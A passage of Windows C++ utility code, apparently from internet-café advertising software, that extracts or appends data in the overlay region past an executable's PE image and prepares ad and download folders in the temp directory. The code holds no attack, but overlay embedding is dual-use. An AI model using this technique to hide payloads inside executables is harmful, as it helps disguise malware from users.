	FILE *fpSrc = fopen(szSrcFilePath,"rb");  
	if(!fpSrc)
	{
		delete[] pData;
		pData = NULL;
		return FALSE;
	}
	
	fseek(fpSrc,iPESzie,SEEK_SET);  
	fread(pData, 1, iDataLen, fpSrc);
	fclose(fpSrc);
	fpSrc = NULL;

	MakeSureDirectoryPathExists(szDstFilePath);
	FILE* fpDst = fopen(szDstFilePath, "wb+");
	if (fpDst)
	{
		fwrite(pData, 1, iDataLen, fpDst);
		fclose(fpDst);
		fpDst = NULL;
		bRet = TRUE;
	}

	delete[] pData;
	pData = NULL;

	return bRet;
}

BOOL Utility_AddOverlayData(LPCSTR szSrcFilePath, LPVOID pData, int iDataLen)
{
	FILE *fpSrc = fopen(szSrcFilePath,"ab");  
	if(!fpSrc)
	{
		return FALSE;
	}

	fwrite(pData, 1, iDataLen, fpSrc);
	fclose(fpSrc);
	return TRUE;
}

BOOL Utility_AddOverlayFile(LPCSTR szSrcFilePath, LPCSTR szDstFilePath)
{
	int iSrcLen = Utility_GetFileSize(szSrcFilePath);
	if (iSrcLen <= 0)
	{
		return FALSE;
	}

	FILE *fpSrc = fopen(szSrcFilePath,"rb");  
	if(!fpSrc)
	{
		return FALSE;
	}

	PBYTE pBuf = new BYTE[iSrcLen];
	fread(pBuf, 1, iSrcLen, fpSrc);
	fclose(fpSrc);
	fpSrc = NULL;

	Utility_AddOverlayData(szDstFilePath, pBuf, iSrcLen);
	delete[] pBuf;
	pBuf = NULL;

	return TRUE;
}

VOID Utility_GetNetbarADDir(std::string& dstDir)
{
	string strTmp;
	Utility_GetSysTmpFolder(strTmp);
	dstDir = strTmp + "\\NetbarAD\\";
	MakeSureDirectoryPathExists(dstDir.c_str());
}

VOID Utility_GetDownloadDir(std::string& dstDir)
{
	string strTmp;
	Utility_GetSysTmpFolder(strTmp);
	dstDir = strTmp + "\\Temp\\";
	MakeSureDirectoryPathExists(dstDir.c_str());
}